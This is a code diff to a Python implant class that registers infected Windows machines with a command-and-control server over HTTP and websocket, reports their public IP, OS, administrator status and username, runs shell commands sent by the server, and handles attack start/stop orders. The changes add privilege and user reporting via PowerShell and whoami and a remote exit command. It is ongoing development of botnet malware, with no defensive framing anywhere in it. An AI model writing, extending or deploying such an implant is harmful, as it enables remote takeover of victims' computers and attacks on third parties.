@@ -35,6 +35,7 @@ class Impl:
 
     async def run(self) -> None:
         
+
         while self.running:
             try:
                 
@@ -64,15 +65,17 @@ class Impl:
         try:
             
             async with connect(
-                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
+                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
                 ping_interval=20,
                 ping_timeout=10,
                 close_timeout=10,
                 open_timeout=30
             ) as ws:
+                
                 self.retry_count = 0  
                 
                 
+
                 while self.running:
                     try:
                         await self._handle_commands(ws)
@@ -90,6 +93,8 @@ class Impl:
             cmd = await asyncio.wait_for(ws.recv(), timeout=60)
             data = json.loads(cmd)
 
+            
+
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
             elif 'chunk' in data:
@@ -102,7 +107,9 @@ class Impl:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
-        
+            elif 'finish' in data:
+                await self._exit(ws)
+
         except asyncio.TimeoutError:
             
             pass
@@ -510,6 +517,10 @@ class Impl:
                         attack['loop']
                     )
 
+    async def _exit(self, ws):
+        
+        await ws.close()
+        sys.exit(0)
 
     
     async def register(self) -> bool:
@@ -520,10 +531,10 @@ class Impl:
             'public_ip': self._get_public_ip(),
             'local_ip': self._get_local_ips(),
             'operating_system': self._get_operating_system(),
-            'impl_id': self.impl_id
+            'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
+            'root': self._get_root(),
+            'user': self._get_user()
         }
-
-        req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",  data=model, timeout=10)
 
 
         max_attempts = 3
@@ -532,8 +543,7 @@ class Impl:
             if attempt < max_attempts - 1:
                 await asyncio.sleep(3)
             try:
-                req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",  data=model, timeout=10)
-
+                req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),  data=model, timeout=10)
                 if req.status_code == 200:
                     return True
                 else:
@@ -575,6 +585,18 @@ class Impl:
         sysop, err, _ = self._execute_shell_command('(Get-CimInstance Win32_OperatingSystem).Caption')
         return sysop.strip() if sysop else "undefined"
     
+    def _get_root(self) -> bool:
+        isAdmin, err, _ = self._execute_shell_command('([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')
+
+        if isAdmin.strip() == "True":
+            return True
+        else:
+            return False
+    
+    def _get_user(self) -> str:
+        user, err, _ = self._execute_shell_command('whoami')
+        return user.strip() if user else "undefined"
+    
 
 
 
@@ -585,6 +607,7 @@ if __name__ == "__main__":
     
     
     impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+
     
     def signal_handler(sig, frame):
         impl.running = False
